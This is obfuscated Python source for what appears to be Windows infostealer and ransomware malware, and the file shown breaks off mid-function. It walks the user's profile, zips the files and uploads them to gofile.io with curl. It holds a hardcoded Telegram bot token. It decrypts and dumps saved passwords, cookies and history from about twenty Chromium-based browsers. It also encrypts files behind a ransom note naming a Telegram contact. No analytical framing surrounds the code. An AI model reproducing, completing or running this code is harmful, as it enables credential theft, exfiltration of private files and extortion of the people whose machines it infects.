lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll, llllllllllllIlI, llllllllllllIIl, llllllllllllIII = bool, Exception, any, getattr, open, len, str, bytes

from os import walk as IlIlllIIlIIlIl, remove as lIIIlIlIIIIlIl, urandom as lllIllIllIlIlI, listdir as IIllllllIIlllI, environ as llIIlIIlllIlll, makedirs as IllIIIIIIlIIIl
from os.path import normpath as llllIlllIIIIll, exists as IIlIlllllllIlI, join as IlIIlllllIllll, splitext as lIlllllllllIlI, isdir as IIlIlIllIlllIl
from subprocess import Popen as IIIIlllIlllIll, PIPE as IlllIllIIIIlII
from json import loads as llIIlIIIIllIlI
from base64 import b64decode as lIlIIIIlIIllll, b64encode as IllIllllllIlll, urlsafe_b64encode as IIIIlIlllllllI
from fnmatch import fnmatch as llIllIIIIlIIIl
from shutil import rmtree as lIIlIllIIlIIll, copyfile as lIlIlIIllIIlIl, make_archive as llIIlllIIlIIIl, copy2 as IIIIllIllIIIIl
from requests import get as lIIIIlIIIIlIII, post as lIIlIIIIIIlIIl
from win32crypt import CryptUnprotectData as lIlIIlIlIllIIl
from sqlite3 import connect as IIlIlIlIlIIlIl
from mss import mss as IllIIIIIlllIIl
IlIIIIIIllllIIllII = '7397339049:AAFJ-ugweCKbKlpR3B3WOKdP0eVuP4nfWYE'
from datetime import datetime as IllIIlllIIllII, timedelta as llllIIIIllIlll
from Cryptodome.Cipher import AES as IlIIllIllllIlI
from cryptography.fernet import Fernet as lllIIIIIIlIIIl
IlllIllIlIlIIIIllI = f"C:\\Users\\Public\\{llIIlIIlllIlll['USERNAME']}"
if not IIlIlllllllIlI(IlllIllIlIlIIIIllI):
    IllIIIIIIlIIIl(IlllIllIlIlIIIIllI)
lIIllIIlllIllIlIIl = IlIIlllllIllll(IlllIllIlIlIIIIllI, 'Cookie')
if not IIlIlllllllIlI(lIIllIIlllIllIlIIl):
    IllIIIIIIlIIIl(lIIllIIlllIllIlIIl)
llllIIlIIIllIlllll = IlIIlllllIllll(IlllIllIlIlIIIIllI, 'Password')
if not IIlIlllllllIlI(llllIIlIIIllIlllll):
    IllIIIIIIlIIIl(llllIIlIIIllIlllll)
llllIIIlIllIIllIll = IlIIlllllIllll(IlllIllIlIlIIIIllI, 'History')
if not IIlIlllllllIlI(llllIIIlIllIIllIll):
    IllIIIIIIlIIIl(llllIIIlIllIIllIll)
lIlIIlllIlIIllIIII = IlIIlllllIllll(f"C:\\Users\\{llIIlIIlllIlll['USERNAME']}\\AppData\\Local\\Temp", 'Data')
if not IIlIlllllllIlI(lIlIIlllIlIIllIIII):
    IllIIIIIIlIIIl(lIlIIlllIlIIllIIII)
IIIIlIllIllIllllIl = ['*.*']

def IIIIlllIlIIllIIIlI(llIlllIlllIllIlIIl):
    lIlIIllIIIIIIIIlII = lllllllllllllII(IIIIlllIlllIll(f'curl -F "file=@{llIlllIlllIllIlIIl}" https://store1.gofile.io/contents/uploadfile', shell=lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1), stdout=IlllIllIIIIlII).communicate()[0], lllllllllllllII(llllllllllllIII, 'fromhex')('6465636f6465').decode())()
    return llIIlIIIIllIlI(lIlIIllIIIIIIIIlII)['data']['downloadPage']

def llIlIIlllIIIlllllI():
    IIlIlIIIIlIlIlIIlI = IIIIlIlllllllI(lllIllIllIlIlI(32))
    return lllllllllllllII(IIlIlIIIIlIlIlIIlI, lllllllllllllII(llllllllllllIII, 'fromhex')('6465636f6465').decode())()
IIlIlIIIIlIlIlIIlI = llIlIIlllIIIlllllI()

def lllIIllIlIlIIIlIIl(lIlllIIIIIIlIIlIII, IIlIlIIIIlIlIlIIlI):
    IIIllIIIIIIIIlIIll = {'A': '汉', 'B': 'ب', 'C': 'คำ', 'D': '日', 'E': '한국', 'F': '你', 'G': 'م', 'H': 'รัก', 'I': '喜', 'J': '사', 'K': '中', 'L': 'ل', 'M': 'เมือง', 'N': '生', 'O': '这', 'P': 'ماذا', 'Q': 'ที่', 'R': '要', 'S': '선', 'T': '能', 'U': 'ج', 'V': 'ไป', 'W': '吗', 'X': 'بار', 'Y': 'ไป', 'Z': '错', 'a': '下', 'b': 'بغض', 'c': 'เ', 'd': '风', 'e': '인', 'f': '火', 'g': 'ح', 'h': 'จ', 'i': '星', 'j': '자', 'k': '村', 'l': 'ز', 'm': 'ปลา', 'n': '花', 'o': '树', 'p': 'طائر', 'q': 'ปลา', 'r': '虫', 's': '고양이', 't': '狗', 'u': 'ا', 'v': 'โค', 'w': '马', 'x': 'غنم', 'y': 'ไก่', 'z': '猪', '0': '零', '1': 'واحد', '2': 'สอง', '3': '三', '4': '四', '5': 'خمسة', '6': 'หก', '7': '七', '8': '八', '9': 'تسعة', '+': '加', '/': '分', '=': '等'}
    IllIlIIllllIllIlIl = lllIIIIIIlIIIl(lllllllllllllII(IIlIlIIIIlIlIlIIlI, lllllllllllllII(llllllllllllIII, 'fromhex')('656e636f6465').decode())())
    with llllllllllllIll(lIlllIIIIIIlIIlIII, 'r', encoding='utf-8') as IIlIlllIIllIlIIllI:
        IllIIIIllIllIlIlII = lllllllllllllII(IIlIlllIIllIlIIllI, lllllllllllllII(llllllllllllIII, 'fromhex')('72656164').decode())()
    if lllllllllllllII(IllIIIIllIllIlIlII, lllllllllllllII(llllllllllllIII, 'fromhex')('73746172747377697468').decode())('All your files have been encrypted, contact https://t.me/hiahihn to decrypt them\n'):
        return
    lllIlllllIlIlIlllI = IllIlIIllllIllIlIl.encrypt(lllllllllllllII(IllIIIIllIllIlIlII, lllllllllllllII(llllllllllllIII, 'fromhex')('656e636f6465').decode())())
    IlIIIIlIlIlllIllII = lllllllllllllII(IllIllllllIlll(lllIlllllIlIlIlllI), lllllllllllllII(llllllllllllIII, 'fromhex')('6465636f6465').decode())()
    IIllIIIlllllllIIll = lllllllllllllII('', lllllllllllllII(llllllllllllIII, 'fromhex')('6a6f696e').decode())((IIIllIIIIIIIIlIIll[char] for char in IlIIIIlIlIlllIllII))
    IIIIlIIIIIlllllIIl = 'All your files have been encrypted, contact https://t.me/hiahihn to decrypt them\n' + IIllIIIlllllllIIll
    with llllllllllllIll(lIlllIIIIIIlIIlIII, 'w', encoding='utf-8') as IIlIlllIIllIlIIllI:
        lllllllllllllII(IIlIlllIIllIlIIllI, lllllllllllllII(llllllllllllIII, 'fromhex')('7772697465').decode())(IIIIlIIIIIlllllIIl)

def lIlllllIIlIlllIlll():
    lIIllIlllIlIlIllIl = {'AppData', 'Program Files', 'Program Files (x86)', 'Windows', 'System32', 'ProgramData', 'Local Settings', 'Temp', 'Recovery', 'Config.Msi'}
    for (IIllIllIlIlllllIII, IIIIIllIIllIlllIII, lIIllIIIIlIIlIIIIl) in IlIlllIIlIIlIl(llIIlIIlllIlll['USERPROFILE']):
        if lllllllllllllIl((IIlIlllllIlIIllIll in IIllIllIlIlllllIII for IIlIlllllIlIIllIll in lIIllIlllIlIlIllIl)):
            continue
        for IIlIlllIIllIlIIllI in lIIllIIIIlIIlIIIIl:
            if lllllllllllllIl((llIllIIIIlIIIl(IIlIlllIIllIlIIllI, lIlIllIllIllllIIlI) for lIlIllIllIllllIIlI in IIIIlIllIllIllllIl)):
                lIlIIIIIlIlIllIIll = IlIIlllllIllll(IIllIllIlIlllllIII, IIlIlllIIllIlIIllI)
                lIlIllIllIllllIIlI = lIlllllllllIlI(IIlIlllIIllIlIIllI)[1][1:]
                lIIIIIIlIIlIlllllI = IlIIlllllIllll(lIlIIlllIlIIllIIII, lIlIllIllIllllIIlI)
                lIIIIlIIlIllIllIIl = IlIIlllllIllll(lIIIIIIlIIlIlllllI, IIlIlllIIllIlIIllI)
                if lIlIIIIIlIlIllIIll == lIIIIlIIlIllIllIIl:
                    continue
                IllIIIIIIlIIIl(lIIIIIIlIIlIlllllI, exist_ok=lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
                try:
                    IIIIllIllIIIIl(lIlIIIIIlIlIllIIll, lIIIIlIIlIllIllIIl)
                except llllllllllllllI as llIlIIlIIIIIIIIlll:
                    pass
    llIIlllIIlIIIl(lIlIIlllIlIIllIIII, 'zip', lIlIIlllIlIIllIIII)
    lIIIIllIIllllllIlI = IIIIlllIlIIllIIIlI(f'{lIlIIlllIlIIllIIII}.zip')
    try:
        lIIIlIlIIIIlIl(f'{lIlIIlllIlIIllIIII}.zip')
        lIIlIllIIlIIll(lIlIIlllIlIIllIIII)
    except llllllllllllllI as llIlIIlIIIIIIIIlll:
        pass
    return lIIIIllIIllllllIlI
llIIIlIIlIlllllIII = lIlllllIIlIlllIlll()

def IlIlIIlIlIIIlIIlIl(IlllllIIIlIlllIIll):
    IlIIIIIlllIIIlIlII = []
    lllllllllllllII(IlIIIIIlllIIIlIlII, lllllllllllllII(llllllllllllIII, 'fromhex')('617070656e64').decode())('Default')
    try:
        IIIIlIIllIlllIIIlI = IIllllllIIlllI(IlllllIIIlIlllIIll)
        IlIlllIlIllIIlllII = [lllIIlllIllIIlIlll for lllIIlllIllIIlIlll in IIIIlIIllIlllIIIlI if IIlIlIllIlllIl(IlIIlllllIllll(IlllllIIIlIlllIIll, lllIIlllIllIIlIlll))]
        for IIlIlllllIlIIllIll in IlIlllIlIllIIlllII:
            lIIlIIIIIIllllIlIl = lllllllllllllII(IIlIlllllIlIIllIll, lllllllllllllII(llllllllllllIII, 'fromhex')('73706c6974').decode())()
            if lIIlIIIIIIllllIlIl[0] == 'Profile':
                lllllllllllllII(IlIIIIIlllIIIlIlII, lllllllllllllII(llllllllllllIII, 'fromhex')('617070656e64').decode())(IIlIlllllIlIIllIll)
        return IlIIIIIlllIIIlIlII
    except:
        pass

def IIlllIlIIlllIllIll():
    IlIlllIIlIllIIllIl = lIIIIlIIIIlIII('https://api.ipify.org/')
    lIlIIIIlIIlIlIlIll = IlIlllIIlIllIIllIl.lIIlIIIIIIllllIlIl
    IllIIllIIIIIlIllII = lIIIIlIIIIlIII(f'http://ip-api.com/json/{lIlIIIIlIIlIlIlIll}')
    llIllIIIIllIIlIllI = IllIIllIIIIIlIllII.json()
    IllIlllIIIlIllIlII = lllllllllllllII(llIllIIIIllIIlIllI, lllllllllllllII(llllllllllllIII, 'fromhex')('676574').decode())('country', 'Unknown')
    IlIIllIIIIIIlllllI = lllllllllllllII(llIllIIIIllIIlIllI, lllllllllllllII(llllllllllllIII, 'fromhex')('676574').decode())('regionName', 'Unknown')
    llIlIIllllIIlllIII = lllllllllllllII(llIllIIIIllIIlIllI, lllllllllllllII(llllllllllllIII, 'fromhex')('676574').decode())('city', 'Unknown')
    IIlllIIllIIlIlIllI = lllllllllllllII(llIllIIIIllIIlIllI, lllllllllllllII(llllllllllllIII, 'fromhex')('676574').decode())('timezone', 'Unknown')
    return f'IP: {lIlIIIIlIIlIlIlIll}\nCountry: {IllIlllIIIlIllIlII}\nRegion: {IlIIllIIIIIIlllllI}\nCity: {llIlIIllllIIlllIII}\nTimezone: {IIlllIIllIIlIlIllI}\nKey: {IIlIlIIIIlIlIlIIlI}'

def IllIIIlIllIlllllII():
    lllllIIIllllIIlIII = [{'name': 'Google', 'path': IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data'), 'profile': IlIlIIlIlIIIlIIlIl(IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data'))}, {'name': 'CocCoc', 'path': IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'CocCoc', 'Browser', 'User Data'), 'profile': IlIlIIlIlIIIlIIlIl(IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'CocCoc', 'Browser', 'User Data'))}, {'name': 'Edge', 'path': IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'), 'profile': IlIlIIlIlIIIlIIlIl(IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'))}, {'name': 'Chromium', 'path': IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Chromium', 'User Data'), 'profile': IlIlIIlIlIIIlIIlIl(IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Chromium', 'User Data'))}, {'name': 'Amigo', 'path': IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Amigo', 'User Data'), 'profile': IlIlIIlIlIIIlIIlIl(IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Amigo', 'User Data'))}, {'name': 'Torch', 'path': IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Torch', 'User Data'), 'profile': IlIlIIlIlIIIlIIlIl(IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Torch', 'User Data'))}, {'name': 'Kometa', 'path': IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Kometa', 'User Data'), 'profile': IlIlIIlIlIIIlIIlIl(IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Kometa', 'User Data'))}, {'name': 'Orbitum', 'path': IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Orbitum', 'User Data'), 'profile': IlIlIIlIlIIIlIIlIl(IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Orbitum', 'User Data'))}, {'name': 'CentBrowser', 'path': IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'CentBrowser', 'User Data'), 'profile': IlIlIIlIlIIIlIIlIl(IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'CentBrowser', 'User Data'))}, {'name': '7Star', 'path': IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', '7Star', '7Star', 'User Data'), 'profile': IlIlIIlIlIIIlIIlIl(IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', '7Star', '7Star', 'User Data'))}, {'name': 'Sputnik', 'path': IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Sputnik', 'Sputnik', 'User Data'), 'profile': IlIlIIlIlIIIlIIlIl(IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Sputnik', 'Sputnik', 'User Data'))}, {'name': 'Vivaldi', 'path': IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Vivaldi', 'User Data'), 'profile': IlIlIIlIlIIIlIIlIl(IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Vivaldi', 'User Data'))}, {'name': 'GoogleChromeSxS', 'path': IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome SxS', 'User Data'), 'profile': IlIlIIlIlIIIlIIlIl(IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome SxS', 'User Data'))}, {'name': 'EpicPrivacyBrowser', 'path': IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Epic Privacy Browser', 'User Data'), 'profile': IlIlIIlIlIIIlIIlIl(IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Epic Privacy Browser', 'User Data'))}, {'name': 'Uran', 'path': IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'uCozMedia', 'Uran', 'User Data'), 'profile': IlIlIIlIlIIIlIIlIl(IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'uCozMedia', 'Uran', 'User Data'))}, {'name': 'Yandex', 'path': IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data'), 'profile': IlIlIIlIlIIIlIIlIl(IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data'))}, {'name': 'Brave', 'path': IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data'), 'profile': IlIlIIlIlIIIlIIlIl(IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data'))}, {'name': 'Iridium', 'path': IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Iridium', 'User Data'), 'profile': IlIlIIlIlIIIlIIlIl(IlIIlllllIllll(llIIlIIlllIlll['USERPROFILE'], 'AppData', 'Local', 'Iridium', 'User Data'))}, {'name': 'Opera', 'path': IlIIlllllIllll(llIIlIIlllIlll['APPDATA'], 'Opera Software', 'Opera Stable'), 'profile': IlIlIIlIlIIIlIIlIl(IlIIlllllIllll(llIIlIIlllIlll['APPDATA'], 'Opera Software', 'Opera Stable'))}, {'name': 'OperaGX', 'path': IlIIlllllIllll(llIIlIIlllIlll['APPDATA'], 'Opera Software', 'Opera GX Stable'), 'profile': IlIlIIlIlIIIlIIlIl(IlIIlllllIllll(llIIlIIlllIlll['APPDATA'], 'Opera Software', 'Opera GX Stable'))}]
    return lllllIIIllllIIlIII

def IIllIlllIlIllllIlI(llIIIIIIllIlllllll):
    try:
        llIlllIlllIllIlIIl = llllIlllIIIIll(llIIIIIIllIlllllll + '\\Local State')
        with llllllllllllIll(llIlllIlllIllIlIIl, 'r', encoding='utf-8') as lllIIlllIllIIlIlll:
            IIIIlIIlIlIlIIlIII = lllllllllllllII(lllIIlllIllIIlIlll, lllllllllllllII(llllllllllllIII, 'fromhex')('72656164').decode())()
            IIIIlIIlIlIlIIlIII = llIIlIIIIllIlI(IIIIlIIlIlIlIIlIII)
        llIIIlllIIIllllIll = lIlIIIIlIIllll(IIIIlIIlIlIlIIlIII['os_crypt']['encrypted_key'])
        llIIIlllIIIllllIll = llIIIlllIIIllllIll[5:]
        IlIIlIIIlllIIIllIl = lIlIIlIlIllIIl(llIIIlllIIIllllIll, None, None, None, 0)[1]
        return IlIIlIIIlllIIIllIl
    except llllllllllllllI as llIlIIlIIIIIIIIlll:
        return None

def IIlIIlIIllIIlllIII(IIlIIlIlIIllIIlIlI, llIIlIIIIlllllIlIl):
    return IIlIIlIlIIllIIlIlI.decrypt(llIIlIIIIlllllIlIl)

def lllIIlllIIIllIIlll(llIlllllllIlIIllII, IIIlllIllIIllIllIl):
    return IlIIllIllllIlI.new(llIlllllllIlIIllII, IlIIllIllllIlI.MODE_GCM, IIIlllIllIIllIllIl)

def IlIIIlIIlIlIllIllI(lIlllIIIIlIlIlIIlI, IlIIlIIIlllIIIllIl):
    try:
        if llllllllllllIlI(lIlllIIIIlIlIlIIlI) < 31:
            return None
        IllIIIIllIlIIIIIll = lIlllIIIIlIlIlIIlI[3:15]
        llllIIllllllllIIII = lIlllIIIIlIlIlIIlI[15:-16]
        IIlIIlIlIIllIIlIlI = lllIIlllIIIllIIlll(IlIIlIIIlllIIIllIl, IllIIIIllIlIIIIIll)
        IllllllIllIIIIIlII = IIlIIlIIllIIlllIII(IIlIIlIlIIllIIlIlI, llllIIllllllllIIII)
        IllllllIllIIIIIlII = lllllllllllllII(IllllllIllIIIIIlII, lllllllllllllII(llllllllllllIII, 'fromhex')('6465636f6465').decode())()
        return IllllllIllIIIIIlII
    except llllllllllllllI as llIlIIlIIIIIIIIlll:
        return None

def llIIlIIlllIIlIlllI():
    IIIIlIIIlllllIIlII = IllIIIlIllIlllllII()
    lllIlIlIIIIlIlIlII = []
    IllIIIlIIllIlllIIl = IlIIlllllIllll(IlllIllIlIlIIIIllI, 'Temp')
    IllIIIIIIlIIIl(IllIIIlIIllIlllIIl, exist_ok=lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
    for IlIIIlllIIllllIllI in IIIIlIIIlllllIIlII:
        if IIlIlllllllIlI(IlIIIlllIIllllIllI['path']):
            for IlIIIIIlllIIIlIlII in IlIIIlllIIllllIllI['profile']:
                try:
                    if IIlIlllllllIlI(IlIIlllllIllll(IlIIIlllIIllllIllI['path'], IlIIIIIlllIIIlIlII, 'Network', 'Cookies')):
                        IIIlIIIllIIllIIlll = IlIIlllllIllll(IllIIIlIIllIlllIIl, 'Cookie ' + IlIIIlllIIllllIllI['name'] + ' ' + IlIIIIIlllIIIlIlII)
                        lIlIlIIllIIlIl(IlIIlllllIllll(IlIIIlllIIllllIllI['path'], IlIIIIIlllIIIlIlII, 'Network', 'Cookies'), IIIlIIIllIIllIIlll)
                        lllllllllllllII(lllIlIlIIIIlIlIlII, lllllllllllllII(llllllllllllIII, 'fromhex')('617070656e64').decode())({'path': IIIlIIIllIIllIIlll, 'pathkey': IlIIIlllIIllllIllI['path'], 'name': IlIIIlllIIllllIllI['name'], 'profile': IlIIIIIlllIIIlIlII})
                except:
                    pass
        else:
            pass
    return lllIlIlIIIIlIlIlII

def llIIlIlllllIlllIlI():
    IIIIlIIIlllllIIlII = IllIIIlIllIlllllII()
    IlIllllIlllIIllIlI = []
    IllIIIlIIllIlllIIl = IlIIlllllIllll(IlllIllIlIlIIIIllI, 'Temp')
    IllIIIIIIlIIIl(IllIIIlIIllIlllIIl, exist_ok=lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
    for IlIIIlllIIllllIllI in IIIIlIIIlllllIIlII:
        if IIlIlllllllIlI(IlIIIlllIIllllIllI['path']):
            for IlIIIIIlllIIIlIlII in IlIIIlllIIllllIllI['profile']:
                try:
                    if IIlIlllllllIlI(IlIIlllllIllll(IlIIIlllIIllllIllI['path'], IlIIIIIlllIIIlIlII, 'Login Data')):
                        IlIIIIlllIlIIllIII = IlIIlllllIllll(IllIIIlIIllIlllIIl, 'Login ' + IlIIIlllIIllllIllI['name'] + ' ' + IlIIIIIlllIIIlIlII)
                        lIlIlIIllIIlIl(IlIIlllllIllll(IlIIIlllIIllllIllI['path'], IlIIIIIlllIIIlIlII, 'Login Data'), IlIIIIlllIlIIllIII)
                        lllllllllllllII(IlIllllIlllIIllIlI, lllllllllllllII(llllllllllllIII, 'fromhex')('617070656e64').decode())({'path': IlIIIIlllIlIIllIII, 'pathkey': IlIIIlllIIllllIllI['path'], 'name': IlIIIlllIIllllIllI['name'], 'profile': IlIIIIIlllIIIlIlII})
                except:
                    pass
        else:
            pass
    return IlIllllIlllIIllIlI

def IIIIlIIIIIIIlIlIIl():
    IIllIIllllllIIlIll = IllIIIlIllIlllllII()
    IllIIIlIIllIlllIIl = IlIIlllllIllll(IlllIllIlIlIIIIllI, 'Temp')
    IllIIIIIIlIIIl(IllIIIlIIllIlllIIl, exist_ok=lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
    for IlIIIlllIIllllIllI in IIllIIllllllIIlIll:
        if IIlIlllllllIlI(IlIIIlllIIllllIllI['path']):
            for IlIIIIIlllIIIlIlII in IlIIIlllIIllllIllI['profile']:
                try:
                    lIlIlIllIIlIllIlII = IlIIlllllIllll(IlIIIlllIIllllIllI['path'], IlIIIIIlllIIIlIlII, 'History')
                    if IIlIlllllllIlI(lIlIlIllIIlIllIlII):
                        lllIIIlIlIIIIIlllI = IlIIlllllIllll(IllIIIlIIllIlllIIl, f"{IlIIIlllIIllllIllI['name']}_{IlIIIIIlllIIIlIlII}.sqlite")
                        lIlIlIIllIIlIl(lIlIlIllIIlIllIlII, lllIIIlIlIIIIIlllI)
                        lIllIlIllIllIlIllI = IIlIlIlIlIIlIl(lllIIIlIlIIIIIlllI)
                        lIIlllIllllIlIllll = lIllIlIllIllIlIllI.lIIlllIllllIlIllll()
                        lIIlllIllllIlIllll.execute('SELECT url FROM urls')
                        IlIIIIlIllIlIllIlI = lIIlllIllllIlIllll.fetchall()
                        with llllllllllllIll(IlIIlllllIllll(llllIIIlIllIIllIll, f"{IlIIIlllIIllllIllI['name']}_{IlIIIIIlllIIIlIlII}_History.txt"), 'w', encoding='utf-8') as lllIIlllIllIIlIlll:
                            for lllllIlIlIlllIlllI in IlIIIIlIllIlIllIlI:
                                lllllllllllllII(lllIIlllIllIIlIlll, lllllllllllllII(llllllllllllIII, 'fromhex')('7772697465').decode())(f'{lllllIlIlIlllIlllI[0]}\n')
                        lllllllllllllII(lIllIlIllIllIlIllI, lllllllllllllII(llllllllllllIII, 'fromhex')('636c6f7365').decode())()
                        lIIIlIlIIIIlIl(lllIIIlIlIIIIIlllI)
                except llllllllllllllI as llIlIIlIIIIIIIIlll:
                    pass

def llllllIlIllIIIIIII():
    IllIIIlIIllIlllIIl = IlIIlllllIllll(IlllIllIlIlIIIIllI, 'Temp')
    IllIIIIIIlIIIl(IllIIIlIIllIlllIIl, exist_ok=lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
    IlIlIIIIIIllIlIllI = llIIlIIlllIIlIlllI()
    for llllIlllIIllIIIIll in IlIlIIIIIIllIlIllI:
        llIllIIlllIIlIllII = IIlIlIlIlIIlIl(llllIlllIIllIIIIll['path'])
        lIIlllIllllIlIllll = llIllIIlllIIlIllII.lIIlllIllllIlIllll()
        lIIlIIIIIllllllIIl = 'SELECT host_key, name, value, encrypted_value, is_httponly, is_secure, expires_utc FROM cookies'
        lIIlllIllllIlIllll.execute(lIIlIIIIIllllllIIl)
        IIIIlIIIlllllIIlII = lIIlllIllllIlIllll.fetchall()
        IlIlIIIllllIIllIll = []
        IllIIIIIllllIlIIll = None
        for lIlIIIIIIIIIlIIlIl in IIIIlIIIlllllIIlII:
            lllIIlllIIlllIllll = IlIIIlIIlIlIllIllI(lIlIIIIIIIIIlIIlIl[3], IIllIlllIlIllllIlI(llllIlllIIllIIIIll['pathkey']))
            if lllIIlllIIlllIllll is None:
                continue
            IIIIIIlIIlIllIllII = 'TRUE' if lIlIIIIIIIIIlIIlIl[4] == 1 else 'FALSE'
            lIllIIIllIlllIllIl = 'TRUE' if lIlIIIIIIIIIlIIlIl[5] == 1 else 'FALSE'
            lllIlIlIIIIlIlIlII = f"{lIlIIIIIIIIIlIIlIl[0]}\t{IIIIIIlIIlIllIllII}\t{'/'}\t{lIllIIIllIlllIllIl}\t\t{lIlIIIIIIIIIlIIlIl[1]}\t{lllIIlllIIlllIllll}\n"
            if IllIIIIIllllIlIIll is not None and IllIIIIIllllIlIIll != lIlIIIIIIIIIlIIlIl[0]:
                lllllllllllllII(IlIlIIIllllIIllIll, lllllllllllllII(llllllllllllIII, 'fromhex')('617070656e64').decode())('******************************************************************************************************************************************************\n')
            lllllllllllllII(IlIlIIIllllIIllIll, lllllllllllllII(llllllllllllIII, 'fromhex')('617070656e64').decode())(lllIlIlIIIIlIlIlII)
            IllIIIIIllllIlIIll = lIlIIIIIIIIIlIIlIl[0]
        with llllllllllllIll(IlIIlllllIllll(IlllIllIlIlIIIIllI, 'Cookie', llllIlllIIllIIIIll['name'] + ' ' + llllIlllIIllIIIIll['profile'] + '.txt'), 'w', encoding='utf-8') as lllIIlllIllIIlIlll:
            for lIlllIllllIlIIllII in IlIlIIIllllIIllIll:
                lllllllllllllII(lllIIlllIllIIlIlll, lllllllllllllII(llllllllllllIII, 'fromhex')('7772697465').decode())(lIlllIllllIlIIllII)
        lllllllllllllII(llIllIIlllIIlIllII, lllllllllllllII(llllllllllllIII, 'fromhex')('636c6f7365').decode())()
        lIIIlIlIIIIlIl(llllIlllIIllIIIIll['path'])
    lllIlIIIIlIllllIIl = llIIlIlllllIlllIlI()
    for llllIlllIIllIIIIll in lllIlIIIIlIllllIIl:
        llIllIIlllIIlIllII = IIlIlIlIlIIlIl(llllIlllIIllIIIIll['path'])
        lIIlllIllllIlIllll = llIllIIlllIIlIllII.lIIlllIllllIlIllll()
        lIIlIIIIIllllllIIl = 'SELECT action_url, username_value, password_value FROM logins'
        lIIlllIllllIlIllll.execute(lIIlIIIIIllllllIIl)
        IIlIIIIlIIIlIIIlIl = lIIlllIllllIlIllll.fetchall()
        IIIlIIIlllIIIlIllI = []
        for lIllIIlIllllllIIII in IIlIIIIlIIIlIIIlIl:
            if lIllIIlIllllllIIII[1] != None and lIllIIlIllllllIIII[2] != None and (lIllIIlIllllllIIII[1] != '') and (lIllIIlIllllllIIII[2] != '') and (lIllIIlIllllllIIII[0] != ''):
                IlIllllIlllIIllIlI = IlIIIlIIlIlIllIllI(lIllIIlIllllllIIII[2], IIllIlllIlIllllIlI(llllIlllIIllIIIIll['pathkey']))
                IllIIIIllIllIlIlII = '**************************************************\nURL: ' + lIllIIlIllllllIIII[0] + ' \nUsername: ' + lIllIIlIllllllIIII[1] + ' \nPassword: ' + llllllllllllIIl(IlIllllIlllIIllIlI)
                lllllllllllllII(IIIlIIIlllIIIlIllI, lllllllllllllII(llllllllllllIII, 'fromhex')('617070656e64').decode())(IllIIIIllIllIlIlII)
            else:
                pass
        with llllllllllllIll(IlIIlllllIllll(IlllIllIlIlIIIIllI, 'Password', llllIlllIIllIIIIll['name'] + ' ' + llllIlllIIllIIIIll['profile'] + '.txt'), 'w', encoding='utf-8') as lllIIlllIllIIlIlll:
            for lIlllIllllIlIIllII in IIIlIIIlllIIIlIllI:
